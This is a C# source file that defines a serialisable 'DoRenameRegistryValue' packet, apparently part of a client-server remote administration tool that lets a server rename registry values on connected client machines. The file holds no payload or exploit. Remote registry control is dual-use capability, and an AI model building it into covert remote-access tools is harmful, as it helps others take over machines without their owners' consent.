using Serveur.Controllers.Server;
using Serveur.Packets;
using ZeroFormatter;

namespace MosaiqueServeur.Packets.ServerPackets
{
    [ZeroFormattable]
    public class DoRenameRegistryValue : IPackets
    {
        public override TypePackets Type
        {
            get
            {
                return TypePackets.DoRenameRegistryValue;
            }
        }

        [Index(0)]
        public virtual string keyPath { get; set; }

        [Index(1)]
        public virtual string oldValueName { get; set; }

        [Index(2)]
        public virtual string newValueName { get; set; }

        public DoRenameRegistryValue()
        {
        }

        public DoRenameRegistryValue(string keyPath, string oldValueName, string newValueName)
        {
            this.keyPath = keyPath;
            this.oldValueName = oldValueName;
            this.newValueName = newValueName;
        }

        public void Execute(ClientMosaique client)
        {
            client.send(this);
        }
    }
}
